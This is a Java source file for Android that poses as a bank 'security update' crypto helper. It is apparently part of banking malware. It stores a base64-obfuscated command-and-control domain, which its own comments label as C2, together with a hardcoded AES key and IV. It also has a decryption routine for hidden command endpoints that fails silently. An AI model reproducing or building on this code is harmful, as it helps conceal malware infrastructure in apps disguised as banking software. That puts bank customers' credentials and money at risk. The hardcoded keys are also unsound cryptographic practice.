package com.bank.security.update;

import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class CryptoHelper {
    // Encrypted C2 and command endpoints
    public static final String OBFUSCATED_C2 = "dGVzdC1jMmJhbmsuaW5mbw=="; // base64 encoded
    private static final byte[] AES_KEY = "9876543210123456".getBytes();
    private static final byte[] AES_IV = "1234567890123456".getBytes();

    public static String decryptString(String base64Encrypted) {
        try {
            byte[] cipherBytes = Base64.decode(base64Encrypted, Base64.DEFAULT);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(AES_KEY, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(AES_IV);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
            byte[] decrypted = cipher.doFinal(cipherBytes);
            return new String(decrypted, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    public static String getC2Domain() {
        return new String(Base64.decode(OBFUSCATED_C2, Base64.DEFAULT));
    }
}
